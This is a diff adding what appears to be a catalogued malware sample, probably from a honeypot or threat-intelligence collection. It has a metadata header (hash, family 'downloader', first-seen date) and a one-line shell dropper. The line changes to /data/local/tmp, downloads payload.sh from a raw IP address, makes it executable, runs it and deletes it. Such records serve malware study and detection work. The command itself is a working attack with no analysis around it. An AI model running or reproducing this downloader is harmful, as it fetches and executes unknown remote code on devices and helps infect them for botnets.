@@ -1,0 +1,10 @@
+# sha256: f1b99a3b8b71a95ccb0c5170aeff69b94ed3bd991e3a6f6cf786b171ba5cf8b7
+# family: downloader
+# kind: script
+# size_bytes: 111
+# first_seen: 2026-07-23 11:45:56.354828 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+cd /data/local/tmp; wget http://94.154.43.51/payload.sh; chmod 777 payload.sh; sh payload.sh; rm -rf payload.sh
